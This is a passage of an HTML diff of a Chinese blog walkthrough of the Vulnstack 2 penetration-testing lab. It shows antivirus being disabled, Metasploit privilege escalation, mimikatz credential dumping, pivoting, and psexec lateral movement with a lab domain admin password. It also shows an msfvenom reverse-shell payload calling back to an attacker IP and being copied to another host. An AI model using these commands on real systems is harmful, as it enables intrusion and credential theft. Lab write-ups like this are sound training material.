+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696_hu861138ef61db83f8cb49dac75f37b936_20264_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696_hu861138ef61db83f8cb49dac75f37b936_20264_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;399px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tasklist /svc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;将结果放到杀软在线网站检查&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6.png&#34;
+	width=&#34;1357&#34;
+	height=&#34;593&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6_hu5293cc9b3e7270bfb3dfad6bd9fe2012_37534_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6_hu5293cc9b3e7270bfb3dfad6bd9fe2012_37534_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;549px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584.png&#34;
+	width=&#34;912&#34;
+	height=&#34;514&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584_hu09ffaef5eadaf8a1b033c391075cc657_81144_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584_hu09ffaef5eadaf8a1b033c391075cc657_81144_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;425px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有360在,免杀不会,直接物理关闭360&lt;/p&gt;
+&lt;p&gt;关掉就能连上了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243.png&#34;
+	width=&#34;698&#34;
+	height=&#34;206&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243_hue841a33f169920ff9ed7135920fc9856_54550_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243_hue841a33f169920ff9ed7135920fc9856_54550_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;338&#34;
+		data-flex-basis=&#34;813px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cs&#34;&gt;cs
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6.png&#34;
+	width=&#34;1050&#34;
+	height=&#34;801&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6_hu945ffa650140a6aa86066c6673e4fdf5_95183_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6_hu945ffa650140a6aa86066c6673e4fdf5_95183_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;131&#34;
+		data-flex-basis=&#34;314px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9.png&#34;
+	width=&#34;612&#34;
+	height=&#34;96&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9_hu691fa1af3cb8e4f65bc68fea49a20943_32758_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9_hu691fa1af3cb8e4f65bc68fea49a20943_32758_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;637&#34;
+		data-flex-basis=&#34;1530px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;服了,死活上线不了cs&lt;/p&gt;
+&lt;p&gt;这里就用msf来测&lt;/p&gt;
+&lt;h3 id=&#34;msf提权&#34;&gt;msf提权
+&lt;/h3&gt;&lt;p&gt;这里getuid一开始是&lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;我&lt;code&gt;getsystem&lt;/code&gt;提权(在关了防火墙和360的前提下)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a.png&#34;
+	width=&#34;626&#34;
+	height=&#34;131&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a_hu39f9af5aa49aa03f3ba07a089efb87a3_22057_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a_hu39f9af5aa49aa03f3ba07a089efb87a3_22057_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;477&#34;
+		data-flex-basis=&#34;1146px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;chcp 65001&lt;/code&gt;修复乱码&lt;/p&gt;
+&lt;p&gt;迁移进程&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ps&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;migrate&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42.png&#34;
+	width=&#34;760&#34;
+	height=&#34;93&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42_hu2464e67ac99f073348b7f6a856d1d9b7_24873_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42_hu2464e67ac99f073348b7f6a856d1d9b7_24873_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;817&#34;
+		data-flex-basis=&#34;1961px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;内网探测&#34;&gt;内网探测
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ipconfig/all&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f.png&#34;
+	width=&#34;782&#34;
+	height=&#34;553&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f_hu58a825db587a453f111b847baea3e9ac_106217_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f_hu58a825db587a453f111b847baea3e9ac_106217_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;141&#34;
+		data-flex-basis=&#34;339px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能找到内网&lt;code&gt;10.10.10.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;退回meterpreter查看域控&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run post/windows/gather/enum_domain&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c.png&#34;
+	width=&#34;489&#34;
+	height=&#34;81&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c_hue6100b8f89336f3918fb70bc951767ff_13316_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c_hue6100b8f89336f3918fb70bc951767ff_13316_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;603&#34;
+		data-flex-basis=&#34;1448px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看域成员&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run post/windows/gather/enum_ad_computers&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这个报错看不了&lt;/p&gt;
+&lt;h3 id=&#34;搭建隧道&#34;&gt;搭建隧道
+&lt;/h3&gt;&lt;p&gt;查看路由&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run post/multi/manage/autoroute&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2.png&#34;
+	width=&#34;732&#34;
+	height=&#34;151&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2_hu26a67f5692631e7c0ae0fbc17587362c_32298_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2_hu26a67f5692631e7c0ae0fbc17587362c_32298_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;484&#34;
+		data-flex-basis=&#34;1163px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看路由&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run autoroute -p&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7.png&#34;
+	width=&#34;502&#34;
+	height=&#34;216&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7_huf41898bd5e264888138c20566ef717a2_24810_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7_huf41898bd5e264888138c20566ef717a2_24810_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;232&#34;
+		data-flex-basis=&#34;557px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;退到上层，使用socks4a进行代理，端口与proxychains里设置一致即可：&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;background
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use auxiliary/server/socks_proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815.png&#34;
+	width=&#34;521&#34;
+	height=&#34;160&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815_hua297aeb2ada41da1f83b6223081a914e_43634_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815_hua297aeb2ada41da1f83b6223081a914e_43634_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;325&#34;
+		data-flex-basis=&#34;781px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd.png&#34;
+	width=&#34;360&#34;
+	height=&#34;170&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd_hu36462e51eb671e927cd04b2113df4811_16627_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd_hu36462e51eb671e927cd04b2113df4811_16627_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;211&#34;
+		data-flex-basis=&#34;508px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;探测主机&#34;&gt;探测主机
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;use post/windows/gather/arp_scanner&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7.png&#34;
+	width=&#34;649&#34;
+	height=&#34;138&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7_hu42305b496a442c08a96d1873e73e9efc_43160_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7_hu42305b496a442c08a96d1873e73e9efc_43160_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;470&#34;
+		data-flex-basis=&#34;1128px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3.png&#34;
+	width=&#34;607&#34;
+	height=&#34;155&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3_hua9348911737b40efee4021f6787dac32_50563_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3_hua9348911737b40efee4021f6787dac32_50563_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;391&#34;
+		data-flex-basis=&#34;939px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.10.10&lt;/code&gt;是域控,&lt;code&gt;10.10.10.80&lt;/code&gt;是WEB,&lt;code&gt;255和254&lt;/code&gt;是广播,所以&lt;code&gt;10.10.10.128&lt;/code&gt;是另一个域成员PC的&lt;/p&gt;
+&lt;h3 id=&#34;获取明文密码&#34;&gt;获取明文密码
+&lt;/h3&gt;&lt;p&gt;退回&lt;code&gt;meterpreter&lt;/code&gt;加载mimikatz获取明文密码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;load kiwi&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;creds_all&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;横向移动&#34;&gt;横向移动
+&lt;/h2&gt;&lt;h3 id=&#34;dc&#34;&gt;DC
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f.png&#34;
+	width=&#34;850&#34;
+	height=&#34;534&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f_hue45f76d7cacf907fe2a121570719f8df_161492_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f_hue45f76d7cacf907fe2a121570719f8df_161492_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;382px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过psexec横向移动&lt;/p&gt;
+&lt;p&gt;在上面通过kiwi获得域管理员的密码账号&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;background&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#退回session，进入msf中&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.10.10.0&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;255.255.255.0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session_id&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#在msf中设置路由访问内网&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exploit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;smb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;psexec&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#使用psexec&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;meterpreter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bind_tcp&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#创建连接&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rhost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#设置DC机ip&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SMBUser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#设置域管理员账户&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SMBPass&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qaz&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;@WSX&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#设置密码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09.png&#34;
+	width=&#34;869&#34;
+	height=&#34;528&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09_hu8451e7de7b4ef82040d4f9fc5a8bc0ca_224312_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09_hu8451e7de7b4ef82040d4f9fc5a8bc0ca_224312_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;164&#34;
+		data-flex-basis=&#34;395px&#34;
+	
+&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8.png&#34;
+	width=&#34;283&#34;
+	height=&#34;96&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8_huf38ae2e3ec3fb2ce4c9a49057bdc498a_7994_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8_huf38ae2e3ec3fb2ce4c9a49057bdc498a_7994_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;294&#34;
+		data-flex-basis=&#34;707px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿下域控DC机&lt;/p&gt;
+&lt;h3 id=&#34;pc&#34;&gt;PC
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(34, 34, 34);&#34;&gt;生成木马：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.211.147 lport=8899 -f exe -o shell3.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(34, 34, 34);&#34;&gt;开启$IPC:&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WEB机：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use \\10.10.10.128\ipc$ &amp;#34;1qaz@WSX&amp;#34; /user:administrator@de1ay.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;copy shell3.exe \\10.10.10.128\c$
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dir \\10.10.10.128\c$
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这里是开网络共享将shell.exe传到PC机的C盘下
